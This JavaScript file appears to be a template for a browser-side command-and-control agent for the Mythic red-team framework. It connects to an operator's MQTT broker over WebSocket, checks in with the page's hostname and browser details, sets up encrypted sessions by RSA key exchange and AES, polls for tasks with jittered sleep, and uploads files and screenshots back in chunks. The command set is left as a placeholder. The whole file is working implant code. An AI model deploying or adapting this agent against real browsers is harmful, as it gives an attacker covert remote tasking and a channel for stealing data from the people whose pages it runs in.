(function() {
    // =========================================================================
    // CONFIG - Replaced by Mythic during payload generation
    // =========================================================================
    var C = {
        Server:     "mqtt_server",
        Port:       "mqtt_port",
        MQClient:   "mqtt_client",
        MQUser:     "mqtt_user",
        MQPass:     "mqtt_pass",
        RecTopic:   "mqtt_mythic",
        SenTopic:   "mqtt_taskcheck",
        Topic:      "mqtt_topic",
        UseSSL:     "use_ssl",
        PayloadUUID:"UUID_HERE",
        UUID:       "",
        Sleep:      callback_interval,
        Jitter:     callback_jitter,
        KillDate:   "killdate",
        enc_key:    AESPSK,
        wsockets:   "websockets",
        ExchChk:    "encrypted_exchange_check",
        Debug:      agent_debug
    };

    // =========================================================================
    // STATE
    // =========================================================================
    var client      = null;
    var connected   = false;
    var uuid        = C.PayloadUUID;
    var recTopic    = C.Topic + C.RecTopic;
    var senTopic    = C.Topic + C.SenTopic;
    var taskingLoop = null;
    var pendingResponse = null;  // one-shot callback for download registration responses

    // Agent phases: 'init' -> 'eke_sent' -> 'checkin_sent' -> 'running'
    var phase       = 'init';
    var rsaPrivKey  = null;
    var sessionId   = '';
    var tempUUID    = '';

    // Pre-generate RSA keypair immediately if EKE is needed (runs in parallel with mqtt.js load)
    var ekeKeyPromise = null;
    if (C.enc_key && (C.ExchChk === 'True' || C.ExchChk === 'true' || C.ExchChk === true)) {
        ekeKeyPromise = crypto.subtle.generateKey(
            { name: 'RSA-OAEP', modulusLength: 4096, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-1' },
            true, ['encrypt', 'decrypt']
        );
    }

    // =========================================================================
    // UTILITY
    // =========================================================================
    function log() {
        if (!C.Debug) return;
        var args = Array.prototype.slice.call(arguments);
        args.unshift('[agent]');
        console.log.apply(console, args);
    }

    function sleepMs() {
        var base = C.Sleep * 1000;
        var jitter = Math.floor(Math.random() * (base * (C.Jitter / 100)));
        return base + jitter;
    }

    function pastKillDate() {
        if (!C.KillDate) return false;
        return new Date() >= new Date(C.KillDate);
    }

    function randString(len) {
        var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var arr = new Uint8Array(len);
        crypto.getRandomValues(arr);
        var out = '';
        for (var i = 0; i < len; i++) out += chars[arr[i] % chars.length];
        return out;
    }

    function b64Encode(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    function b64Decode(str) {
        return decodeURIComponent(escape(atob(str)));
    }

    function b64ToAB(b64) {
        var bin = atob(b64);
        var buf = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
        return buf.buffer;
    }

    function abToB64(ab) {
        var bytes = new Uint8Array(ab);
        var bin = '';
        for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
        return btoa(bin);
    }

    function concatAB() {
        var total = 0;
        var bufs = [];
        for (var i = 0; i < arguments.length; i++) {
            bufs.push(new Uint8Array(arguments[i]));
            total += arguments[i].byteLength;
        }
        var result = new Uint8Array(total);
        var offset = 0;
        for (var j = 0; j < bufs.length; j++) {
            result.set(bufs[j], offset);
            offset += bufs[j].byteLength;
        }
        return result.buffer;
    }

    // =========================================================================
    // CRYPTO - AES-256-CBC + HMAC-SHA256
    // =========================================================================
    var cryptoKey = null;
    var hmacKey   = null;

    async function setAESKeys(rawKeyBuf) {
        cryptoKey = await crypto.subtle.importKey(
            'raw', rawKeyBuf, { name: 'AES-CBC' }, false, ['encrypt', 'decrypt']
        );
        hmacKey = await crypto.subtle.importKey(
            'raw', rawKeyBuf, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign', 'verify']
        );
    }

    async function initKeys() {
        if (!C.enc_key || !C.enc_key.enc_key) return;
        await setAESKeys(b64ToAB(C.enc_key.enc_key));
    }

    // Encrypt: returns ArrayBuffer of IV(16) + AES-CBC(plaintext) + HMAC-SHA256
    async function encryptRaw(plaintext) {
        var iv = crypto.getRandomValues(new Uint8Array(16));
        var encoded = new TextEncoder().encode(plaintext);

        var ciphertext = await crypto.subtle.encrypt(
            { name: 'AES-CBC', iv: iv }, cryptoKey, encoded
        );

        var ivAndCipher = concatAB(iv.buffer, ciphertext);
        var hmac = await crypto.subtle.sign('HMAC', hmacKey, ivAndCipher);

        return concatAB(ivAndCipher, hmac);
    }

    // Decrypt: takes ArrayBuffer of IV(16) | ciphertext | HMAC(32), returns string
    async function decryptRaw(buf) {
        var raw = new Uint8Array(buf);
        var iv         = raw.slice(0, 16);
        var ciphertext = raw.slice(16, raw.length - 32);
        var hmac       = raw.slice(raw.length - 32);

        var ivAndCipher = concatAB(iv.buffer, ciphertext.buffer);
        var valid = await crypto.subtle.verify('HMAC', hmacKey, hmac.buffer, ivAndCipher);
        if (!valid) throw new Error('HMAC verification failed');

        var decrypted = await crypto.subtle.decrypt(
            { name: 'AES-CBC', iv: iv }, cryptoKey, ciphertext.buffer
        );

        return new TextDecoder().decode(decrypted);
    }

    // =========================================================================
    // CRYPTO - RSA (EKE only)
    // =========================================================================
    async function generateRSAKeyPair() {
        var keyPair = await crypto.subtle.generateKey(
            {
                name: 'RSA-OAEP',
                modulusLength: 4096,
                publicExponent: new Uint8Array([1, 0, 1]),
                hash: 'SHA-1'
            },
            true,
            ['encrypt', 'decrypt']
        );
        rsaPrivKey = keyPair.privateKey;
        return keyPair;
    }

    async function exportPubKey(publicKey) {
        var spki = await crypto.subtle.exportKey('spki', publicKey);
        return abToB64(spki);
    }

    async function rsaDecrypt(b64encrypted) {
        var ciphertext = b64ToAB(b64encrypted);
        var plaintext = await crypto.subtle.decrypt(
            { name: 'RSA-OAEP' },
            rsaPrivKey,
            ciphertext
        );
        return plaintext;
    }

    // =========================================================================
    // MYTHIC MESSAGE FORMAT
    // Outbound: base64( UUID_bytes + encrypted_bytes )
    // Inbound:  base64( UUID_bytes(36) + encrypted_bytes )
    // =========================================================================
    async function buildMessage(data, overrideUUID) {
        var json = JSON.stringify(data);
        var msgUUID = overrideUUID || uuid;
        var uuidBytes = new TextEncoder().encode(msgUUID);

        if (cryptoKey) {
            var encrypted = await encryptRaw(json);
            return abToB64(concatAB(uuidBytes.buffer, encrypted));
        } else {
            var jsonBytes = new TextEncoder().encode(json);
            return abToB64(concatAB(uuidBytes.buffer, jsonBytes.buffer));
        }
    }

    async function parseMessage(raw) {
        var decoded = new Uint8Array(b64ToAB(raw));
        var msgUUID = new TextDecoder().decode(decoded.slice(0, 36));
        var payload = decoded.slice(36);

        if (cryptoKey) {
            var decrypted = await decryptRaw(payload.buffer);
            return { uuid: msgUUID, data: JSON.parse(decrypted) };
        } else {
            var jsonStr = new TextDecoder().decode(payload);
            return { uuid: msgUUID, data: JSON.parse(jsonStr) };
        }
    }

    // =========================================================================
    // MQTT TRANSPORT
    // =========================================================================
    function buildBrokerURL() {
        var protocol = (C.UseSSL === 'True' || C.UseSSL === 'true' || C.UseSSL === true) ? 'wss://' : 'ws://';
        return protocol + C.Server + ':' + C.Port + '/mqtt';
    }

    function mqttConnect() {
        var url = buildBrokerURL();
        log('connecting', url);

        var opts = {
            clientId:        C.MQClient + '_' + Math.random().toString(16).substr(2, 6),
            clean:           true,
            keepalive:       60,
            reconnectPeriod: sleepMs()
        };

        if (C.MQUser) opts.username = C.MQUser;
        if (C.MQPass) opts.password = C.MQPass;

        client = mqtt.connect(url, opts);

        client.on('connect', function() {
            connected = true;
            log('connected');

            client.subscribe(recTopic, { qos: 1 }, function(err) {
                if (err) {
                    log('subscribe error', err.message);
                    return;
                }
                log('subscribed', recTopic);
                if (phase === 'init') {
                    beginCheckin();
                } else if (phase === 'running') {
                    log('reconnected, resuming tasking loop');
                }
            });
        });

        client.on('message', function(topic, message) {
            handleInbound(message.toString());
        });

        client.on('error', function(err) {
            log('error', err.message);
        });

        client.on('close', function() {
            connected = false;
            log('disconnected');
        });

        client.on('reconnect', function() {
            log('reconnecting');
        });
    }

    // =========================================================================
    // SEND
    // =========================================================================
    async function send(data, overrideUUID) {
        if (!client || !connected) return;
        var msg = await buildMessage(data, overrideUUID);
        client.publish(senTopic, msg, { qos: 1 });
    }

    // =========================================================================
    // SEND AND WAIT (for download registration responses)
    // =========================================================================
    function sendAndWait(data) {
        return new Promise(function(resolve) {
            pendingResponse = resolve;
            send(data);
        });
    }

    // =========================================================================
    // FILE DOWNLOAD HELPER
    // =========================================================================
    async function downloadFile(taskId, filename, b64Data, isScreenshot) {
        var CHUNK_SIZE = 51200;
        var B64_CHUNK = Math.floor(CHUNK_SIZE / 3) * 4;
        var totalChunks = Math.ceil(b64Data.length / B64_CHUNK);

        // Step 1: Register download with Mythic (must wait for file_id)
        var regResp = await sendAndWait({
            action: 'post_response',
            responses: [{
                task_id: taskId,
                download: {
                    total_chunks: totalChunks,
                    full_path: filename,
                    chunk_size: CHUNK_SIZE,
                    is_screenshot: isScreenshot
                }
            }]
        });

        var fileId = regResp.responses[0].file_id;
        log('download registered, file_id:', fileId, 'chunks:', totalChunks);

        // Step 2: Send all chunks in parallel (no waiting for ACKs)
        var chunkPromises = [];
        for (var i = 0; i < totalChunks; i++) {
            var start = i * B64_CHUNK;
            var end = Math.min(start + B64_CHUNK, b64Data.length);
            var chunk = b64Data.substring(start, end);

            chunkPromises.push(send({
                action: 'post_response',
                responses: [{
                    task_id: taskId,
                    download: {
                        file_id: fileId,
                        chunk_num: i + 1,
                        chunk_data: chunk
                    }
                }]
            }));
        }

        // Wait for all chunks to be sent (not ACKed, just published)
        await Promise.all(chunkPromises);

        log('download complete, file_id:', fileId);
        return fileId;
    }

    // =========================================================================
    // CHECKIN FLOW
    // =========================================================================
    function buildCheckinData() {
        return {
            action:          'checkin',
            uuid:            C.PayloadUUID,
            ips:             [],
            os:              navigator.platform,
            user:            '',
            host:            window.location.hostname,
            domain:          window.location.hostname,
            pid:             0,
            architecture:    navigator.userAgent,
            integrity_level: 2,
            process_name:    'browser',
            external_ip:     ''
        };
    }

    async function beginCheckin() {
        if (pastKillDate()) {
            shutdown();
            return;
        }

        if ((C.ExchChk === 'True' || C.ExchChk === 'true' || C.ExchChk === true) && C.enc_key) {
            await beginEKE();
        } else {
            phase = 'checkin_sent';
            log('checking in (direct)');
            await send(buildCheckinData());
        }
    }

    // =========================================================================
    // ENCRYPTED KEY EXCHANGE (EKE)
    // =========================================================================
    async function beginEKE() {
        log('starting EKE');

        var keyPair;
        if (ekeKeyPromise) {
            keyPair = await ekeKeyPromise;
            ekeKeyPromise = null;
            rsaPrivKey = keyPair.privateKey;
        } else {
            keyPair = await generateRSAKeyPair();
        }
        var pubKeyB64 = await exportPubKey(keyPair.publicKey);

        sessionId = randString(20);

        phase = 'eke_sent';
        await send({
            action:     'staging_rsa',
            pub_key:    pubKeyB64,
            session_id: sessionId
        });

        log('EKE step 1: pub key sent');
    }

    async function handleEKEResponse(data) {
        if (data.session_id !== sessionId) {
            log('EKE session_id mismatch, ignoring');
            return;
        }

        tempUUID = data.uuid;
        log('EKE step 2: received tempUUID', tempUUID);

        var sessionKeyBuf = await rsaDecrypt(data.session_key);

        await setAESKeys(sessionKeyBuf);
        rsaPrivKey = null;

        phase = 'checkin_sent';
        uuid = tempUUID;

        var checkinData = buildCheckinData();
        await send(checkinData, tempUUID);

        log('EKE step 3: checkin sent with session key');
    }

    // =========================================================================
    // INBOUND MESSAGE HANDLER
    // =========================================================================
    async function handleInbound(raw) {
        try {
            var msg = await parseMessage(raw);

            if (msg.uuid !== uuid && msg.uuid !== C.PayloadUUID && msg.uuid !== tempUUID) return;

            var data = msg.data;

            if (phase === 'eke_sent' && data.action === 'staging_rsa') {
                await handleEKEResponse(data);
                return;
            }

            if (phase === 'checkin_sent' && data.action === 'checkin' && data.id) {
                uuid = data.id;
                C.UUID = data.id;
                phase = 'running';
                log('registered, callback UUID:', uuid);
                startTaskingLoop();
                return;
            }

            if (phase === 'running' && data.action === 'get_tasking' && data.tasks) {
                processTasks(data.tasks);
                return;
            }

            // Mythic acknowledges post_response — route to pending callback if waiting
            if (phase === 'running' && data.action === 'post_response') {
                if (pendingResponse && data.responses) {
                    var cb = pendingResponse;
                    pendingResponse = null;
                    cb(data);
                }
                return;
            }

            log('unhandled', data.action, 'in phase', phase);

        } catch (e) {
            // Silently drop messages we can't decrypt (meant for other agents)
        }
    }

    // =========================================================================
    // COMMAND REGISTRY
    // =========================================================================
    var COMMANDS = {};

    //COMMANDS_HERE

    // =========================================================================
    // TASKING LOOP
    // =========================================================================
    function startTaskingLoop() {
        if (taskingLoop) return;

        async function poll() {
            if (pastKillDate()) {
                shutdown();
                return;
            }

            await send({ action: 'get_tasking', tasking_size: -1 });
            taskingLoop = setTimeout(poll, sleepMs());
        }

        poll();
    }

    function processTasks(tasks) {
        if (!tasks || !tasks.length) return;

        // Execute all tasks in parallel
        var taskPromises = [];
        for (var i = 0; i < tasks.length; i++) {
            var task = tasks[i];
            log('task received', task.command, task.id);
            taskPromises.push(executeTask(task));
        }

        // Don't block - let all tasks run concurrently
        Promise.all(taskPromises).catch(function(e) {
            log('task batch error', e.message);
        });
    }

    async function executeTask(task) {
        var result = {
            task_id:     task.id,
            user_output: '',
            completed:   true,
            status:      'success'
        };

        try {
            if (COMMANDS[task.command]) {
                var output = await COMMANDS[task.command](task);
                result.user_output = (output !== null && output !== undefined && output !== '')
                    ? String(output)
                    : 'No response from browser';
            } else {
                result.user_output = 'unknown command: ' + task.command;
                result.status = 'error';
            }
        } catch (e) {
            result.user_output = 'error: ' + e.message;
            result.status = 'error';
        }

        await send({
            action: 'post_response',
            responses: [result]
        });
    }

    // =========================================================================
    // SHUTDOWN
    // =========================================================================
    function shutdown() {
        log('shutting down');
        if (taskingLoop) clearTimeout(taskingLoop);
        if (client) client.end(true);
        connected = false;
    }

    // =========================================================================
    // MQTT.JS LOADER + INIT
    // =========================================================================
    var MQTT_CDN = 'https://cdnjs.cloudflare.com/ajax/libs/mqtt/5.14.1/mqtt.min.js';

    function loadMqttLib(callback) {
        // If mqtt.js is already embedded/loaded, proceed immediately
        if (typeof mqtt !== 'undefined') {
            callback();
            return;
        }

        // Fallback: load from CDN
        var s = document.createElement('script');
        s.src = MQTT_CDN;
        s.onload = callback;
        s.onerror = function() { log('failed to load mqtt.js from CDN'); };
        (document.head || document.documentElement).appendChild(s);
    }

    async function init() {
        await initKeys();
        mqttConnect();
    }

    loadMqttLib(function() { init(); });

})();
